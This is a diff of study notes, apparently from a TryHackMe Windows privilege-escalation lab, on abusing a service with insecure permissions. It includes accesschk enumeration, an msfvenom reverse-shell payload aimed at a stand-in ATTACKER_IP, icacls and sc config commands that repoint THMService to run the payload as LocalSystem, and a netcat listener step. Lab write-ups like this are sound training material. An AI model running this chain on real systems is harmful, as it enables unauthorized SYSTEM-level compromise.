@@ -26,15 +26,8 @@ accesschk <file, directory, registry key, process, service, object>
 C:\tools\AccessChk> accesschk64.exe /accepteula
 C:\tools\AccessChk> accesschk64.exe -qlc thmservice
   [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
-        SERVICE_QUERY_STATUS
-        SERVICE_QUERY_CONFIG
-        SERVICE_INTERROGATE
-        SERVICE_ENUMERATE_DEPENDENTS
-        SERVICE_PAUSE_CONTINUE
-        SERVICE_START
-        SERVICE_STOP
-        SERVICE_USER_DEFINED_CONTROL
-        READ_CONTROL
+        [...]
+        [...]
   [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
 // highlight-next-line
         SERVICE_ALL_ACCESS
@@ -44,9 +37,8 @@ C:\tools\AccessChk> accesschk64.exe -qlc thmservice
 
 - Generating and Transfering the **PAYLOAD**
 
-```bash
-attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc.exe
-attacker@machine:~$ nc -lvp 4447
+```js
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
 ```
 
 <br/>
@@ -60,7 +52,7 @@ C:\> icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
 <br/>
 
 
-- Modifying the **Service.** We chose <b style={{ color: 'Red' }}>LocalSystem</b> as it is the highest Privileged Account available.
+- Modifying the **Service.** We chose <b style={{ color: 'Red' }}>LocalSystem</b> as it is the Highest Privileged Account available.
 
 ```powershell
 C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
@@ -69,7 +61,7 @@ C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalS
 
 <br/>
 
-- Starting a `netcat` Listener.
+- Starting a `netcat` Listener
 - Restarting the <b style={{ color: 'MediumTurquoise' }}>THMService</b> Service
 
 ```powershell
